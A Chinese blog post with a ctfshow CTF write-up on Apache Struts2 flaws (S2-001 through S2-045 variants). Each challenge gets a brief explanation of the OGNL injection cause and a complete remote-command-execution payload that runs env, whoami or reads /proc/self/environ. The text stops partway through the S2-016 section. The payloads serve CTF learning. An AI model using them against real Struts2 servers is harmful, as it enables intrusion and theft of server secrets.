<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-trophy-1.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-trophy-1.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"www.z1d10t.fun","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"show_result":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="ctfshow-java">
<meta property="og:type" content="article">
<meta property="og:title" content="ctfshow-java struts2框架一览">
<meta property="og:url" content="https://www.z1d10t.fun/post/faf20676.html">
<meta property="og:site_name" content="Z1d10tのBlog">
<meta property="og:description" content="ctfshow-java">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692946075903-915efd11-b4cb-492b-83f0-a95729ce7a62.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692947661826-dd0d571e-eef9-4a67-a9c4-7c26bac99054.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692955967130-30c47a51-06f3-4d81-8dfa-6b8dc8404498.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692960165492-0dc1a65d-933a-4280-9bbc-3ef12278f5d5.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692963120663-1045940c-f911-4e1d-af71-a1808e8f746d.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692963158825-e4b7adae-128b-4bdf-b248-2c600091a40c.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692963566791-1536b3ed-3280-40e4-9a99-55dbe5916d98.png">
<meta property="article:published_time" content="2023-08-26T03:28:13.000Z">
<meta property="article:modified_time" content="2023-08-26T03:29:28.463Z">
<meta property="article:author" content="Z1d10t">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692946075903-915efd11-b4cb-492b-83f0-a95729ce7a62.png">


<link rel="canonical" href="https://www.z1d10t.fun/post/faf20676.html">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://www.z1d10t.fun/post/faf20676.html","path":"post/faf20676.html","title":"ctfshow-java struts2框架一览"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>ctfshow-java struts2框架一览 | Z1d10tのBlog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Z1d10tのBlog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description"> </p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-house fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tag fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-rectangle-list fa-fw"></i>分类</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>博主</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-279-S2-001"><span class="nav-number">2.</span> <span class="nav-text">WEB-279(S2-001)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-280-S2-016%E5%92%8CS2-005"><span class="nav-number">3.</span> <span class="nav-text">WEB-280(S2-016和S2-005)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-281-S2-007"><span class="nav-number">4.</span> <span class="nav-text">WEB-281(S2-007)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-282-S2-008"><span class="nav-number">5.</span> <span class="nav-text">WEB-282(S2-008)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-283-Struts2-showcase%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-number">6.</span> <span class="nav-text">WEB-283(Struts2 showcase远程代码执行漏洞)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-284-S2-012"><span class="nav-number">7.</span> <span class="nav-text">WEB-284(S2-012)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-285-S2-013"><span class="nav-number">8.</span> <span class="nav-text">WEB-285(S2-013)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-286-S2-015"><span class="nav-number">9.</span> <span class="nav-text">WEB-286(S2-015)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-287-S2-016"><span class="nav-number">10.</span> <span class="nav-text">WEB-287(S2-016)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-288-S2-019"><span class="nav-number">11.</span> <span class="nav-text">WEB-288(S2-019)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-289-S2-029"><span class="nav-number">12.</span> <span class="nav-text">WEB-289(S2-029)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-290-S2-032"><span class="nav-number">13.</span> <span class="nav-text">WEB-290(S2-032)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-291-S2-033"><span class="nav-number">14.</span> <span class="nav-text">WEB-291(S2-033)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-292-S2-037"><span class="nav-number">15.</span> <span class="nav-text">WEB-292(S2-037)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-293-S2-045"><span class="nav-number">16.</span> <span class="nav-text">WEB-293(S2-045)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-294-S2-046"><span class="nav-number">17.</span> <span class="nav-text">WEB-294(S2-046)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-295-S2-048"><span class="nav-number">18.</span> <span class="nav-text">WEB-295(S2-048)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-296-S2-052"><span class="nav-number">19.</span> <span class="nav-text">WEB-296(S2-052)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-297-S2-053"><span class="nav-number">20.</span> <span class="nav-text">WEB-297(S2-053)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8E%E8%A8%80"><span class="nav-number">21.</span> <span class="nav-text">后言</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Z1d10t"
      src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blogavatar.jpg">
  <p class="site-author-name" itemprop="name">Z1d10t</p>
  <div class="site-description" itemprop="description">这是什么动物，这是废物</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">79</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">82</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.z1d10t.fun/post/faf20676.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blogavatar.jpg">
      <meta itemprop="name" content="Z1d10t">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Z1d10tのBlog">
      <meta itemprop="description" content="这是什么动物，这是废物">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="ctfshow-java struts2框架一览 | Z1d10tのBlog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          ctfshow-java struts2框架一览
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-08-26 11:28:13 / 修改时间：11:29:28" itemprop="dateCreated datePublished" datetime="2023-08-26T11:28:13+08:00">2023-08-26</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <p>ctfshow-java</p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>硬着头皮学习</p>
<p>好像这个系列讲的全是struts2框架漏洞 就当作是长见识了</p>
<p>Struts2是java语言写的的一个基于MVC设计模式的Web框架</p>
<p>struts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，<code>%&#123;value&#125;</code>并重新填充相应的表单数据。</p>
<p>这里的<code>%&#123;value&#125;</code>简单理解就是和flask的模板注入<code>&#123;&#123;&#125;&#125;</code>差不多 会对里面的内容进行解析</p>
<p>因此我们可以利用其进行命令执行</p>
<p>OGNL表达式中三个符号 <code>% # $</code> 的含义</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%的用途是在标志的属性为字符串类型时，计算OGNL表达式%&#123;&#125;中的值</span><br><span class="line">#的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用</span><br><span class="line">$主要是在Struts 2配置文件中，引用OGNL表达式</span><br></pre></td></tr></table></figure>

<p>其次struts2引擎是我们熟悉的tomcat</p>
<p>github上有专门针对struts2的poc <a target="_blank" rel="noopener" href="https://github.com/HatBoy/Struts2-Scan">https://github.com/HatBoy/Struts2-Scan</a> 不过我还是自己手动捯饬一下</p>
<h1 id="WEB-279-S2-001"><a href="#WEB-279-S2-001" class="headerlink" title="WEB-279(S2-001)"></a>WEB-279(S2-001)</h1><p>获取一些敏感路径的payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 获取tomcat路径</span><br><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br><span class="line"></span><br><span class="line">// 获取web路径</span><br><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#x27;/&#x27;)),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure>

<p>本题payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 命令执行 env，flag在环境变量中</span><br><span class="line">password=%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;&amp;username=1</span><br></pre></td></tr></table></figure>

<h1 id="WEB-280-S2-016和S2-005"><a href="#WEB-280-S2-016和S2-005" class="headerlink" title="WEB-280(S2-016和S2-005)"></a>WEB-280(S2-016和S2-005)</h1><p>S2-003</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Struts2将HTTP的每个参数名解析为ognl语句执行,而ognl表达式是通过#来访问struts的对象，Struts2框架虽然过滤了#来进行过滤，但是可以通过unicode编码（u0023）或8进制（43）绕过了安全限制，达到代码执行的效果</span><br><span class="line"></span><br><span class="line">影响版本：Struts 2.0.0 - Struts 2.0.11.2</span><br></pre></td></tr></table></figure>

<p>因此我们可以利用unicode编码和8进制来bypass <code>#</code></p>
<p>这道题目只能用这个poc做出来 网上的payload都没有回显 <a target="_blank" rel="noopener" href="https://github.com/wyzmgmdg/Struts2Scan">https://github.com/wyzmgmdg/Struts2Scan</a></p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692946075903-915efd11-b4cb-492b-83f0-a95729ce7a62.png" alt="img"></p>
<p>然后S2-016和S2-005都能打通</p>
<p>或者</p>
<p>post传参</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:$&#123;%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27%65%6e%76%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>

<p>需要注意的是我们的命令必须要经过url全字符编码才能成功 也就是我标蓝这里 途中命令为env</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692947661826-dd0d571e-eef9-4a67-a9c4-7c26bac99054.png" alt="img"></p>
<p>参考:<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-005/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/struts2/s2-005/README.zh-cn.md</a></p>
<h1 id="WEB-281-S2-007"><a href="#WEB-281-S2-007" class="headerlink" title="WEB-281(S2-007)"></a>WEB-281(S2-007)</h1><p>原理:</p>
<p>当配置了验证规则 <ActionName>-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回</p>
<p>当用户 age 以str而不是的形式提交时 int，服务器将拼接 <code>“‘“ + value + “‘“ </code>代码，然后使用OGNL表达式对其进行解析。为了成功完成任务，我们需要找到一个配置有相似验证规则的表单字段，以产生转换错误。然后，您可以通过注入SQL单引号的方式注入任何OGNL表达式代码</p>
<p>影响版本：Struts2 2.0.0 - Struts2 2.2.3</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure>

<h1 id="WEB-282-S2-008"><a href="#WEB-282-S2-008" class="headerlink" title="WEB-282(S2-008)"></a>WEB-282(S2-008)</h1><p>原理:</p>
<p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，但是这种情况在生产环境中几乎不可能存在，所以还是很鸡肋。</p>
<p>影响版本：Struts 2.1.0 – 2.3.1</p>
<p>这道题目很奇怪只能用上面的poc脚本才能打成功 看了脚本的构造 payload如下</p>
<p>手动输入就是没有回显 反弹shell也是一样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cmd%27%29.getInputStream%28%29%29)</span><br></pre></td></tr></table></figure>

<h1 id="WEB-283-Struts2-showcase远程代码执行漏洞"><a href="#WEB-283-Struts2-showcase远程代码执行漏洞" class="headerlink" title="WEB-283(Struts2 showcase远程代码执行漏洞)"></a>WEB-283(Struts2 showcase远程代码执行漏洞)</h1><p>原理：</p>
<p>这个漏洞再次来源于s2-003、s2-005</p>
<p>参考Struts2漏洞分析之Ognl表达式特性引发的新思路，文中说到，该引入ognl的方法不光可能出现在这个漏洞中，也可能出现在其他java应用中</p>
<p>Struts2对s2-003的修复方法是禁止静态方法调用，在s2-005中可直接通过OGNL绕过该限制，对于<code>#</code>号，同样使用编码<code>\u0023</code>或<code>\43</code>进行绕过；于是Struts2对s2-005的修复方法是禁止<code>\</code>等特殊符号，使用户不能提交反斜线</p>
<p>但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在example参数中，然后使用<code>/helloword.acton?example=&lt;OGNL statement&gt;&amp;(example)(&#39;xxx&#39;)=1</code>的方法来执行它，从而绕过官方对<code>#、\</code>等特殊字符的防御</p>
<p>通过Struts2框架中ParametersInterceptor拦截器只检查传入的参数名而不检查参数值的方式进行构造OGNL表达式从而造成代码执行</p>
<p>payload: 来源于<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/280245.html">https://www.freebuf.com/articles/web/280245.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ajax/example5.action?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27whoami%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</span><br></pre></td></tr></table></figure>

<h1 id="WEB-284-S2-012"><a href="#WEB-284-S2-012" class="headerlink" title="WEB-284(S2-012)"></a>WEB-284(S2-012)</h1><p>原理:</p>
<p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 <code>$&#123;param_name&#125;</code> 作为重定向变量</p>
<p>比如:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xml</span><br><span class="line">&lt;package name=&quot;S2-012&quot; extends=&quot;struts-default&quot;&gt;</span><br><span class="line">    &lt;action name=&quot;user&quot; class=&quot;com.demo.action.UserAction&quot;&gt;</span><br><span class="line">        &lt;result name=&quot;redirect&quot; type=&quot;redirect&quot;&gt;/index.jsp?name=$&#123;name&#125;&lt;/result&gt;</span><br><span class="line">        &lt;result name=&quot;input&quot;&gt;/index.jsp&lt;/result&gt;</span><br><span class="line">        &lt;result name=&quot;success&quot;&gt;/index.jsp&lt;/result&gt;</span><br><span class="line">    &lt;/action&gt;</span><br><span class="line">&lt;/package&gt;</span><br></pre></td></tr></table></figure>

<p>这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;, &quot;/proc/self/environ&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>

<h1 id="WEB-285-S2-013"><a href="#WEB-285-S2-013" class="headerlink" title="WEB-285(S2-013)"></a>WEB-285(S2-013)</h1><p>原理：</p>
<p>Apache Struts2的s:a和s:url标签都提供了一个includeParams属性。此属性允许使用的值包括none、get、all。当该属性被设置为get或all时，Apache Struts2会将用户提交的参数值作为Ognl表达式执行。攻击者可以提交带有恶意的Ongl表达式，达到执行任意Java代码的目的。只要基于Apache Struts2开发的JSP代码中使用了url/a标签并且设置了includeParams属性为all或get，远程攻击者即可利用此漏执行任意命令。</p>
<p>payload: 参考:<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/266386#h3-3">https://www.anquanke.com/post/id/266386#h3-3</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link.action?fakeParam=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27env%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D</span><br></pre></td></tr></table></figure>

<h1 id="WEB-286-S2-015"><a href="#WEB-286-S2-015" class="headerlink" title="WEB-286(S2-015)"></a>WEB-286(S2-015)</h1><p>原理：</p>
<p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
<p>影响版本：</p>
<ul>
<li>Struts2.3.5 – 2.3.31</li>
<li>Struts2.5 – 2.5.10</li>
</ul>
<p>你妈 说是S2-015的漏洞 但是poc要用S2-045才能打通</p>
<p>而且用poc脚本打通S2-015里面没有flag</p>
<p>脚本或者</p>
<p>payload: 来源：<a target="_blank" rel="noopener" href="https://www.hacking8.com/bug-product/Struts2/Struts2-S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.html">https://www.hacking8.com/bug-product/Struts2/Struts2-S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;env&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692955967130-30c47a51-06f3-4d81-8dfa-6b8dc8404498.png" alt="img"></p>
<h1 id="WEB-287-S2-016"><a href="#WEB-287-S2-016" class="headerlink" title="WEB-287(S2-016)"></a>WEB-287(S2-016)</h1><p>原理：</p>
<p>问题主要出在对于特殊URL处理中，redirect与redirectAction后面跟上Ognl表达式会被服务器执行</p>
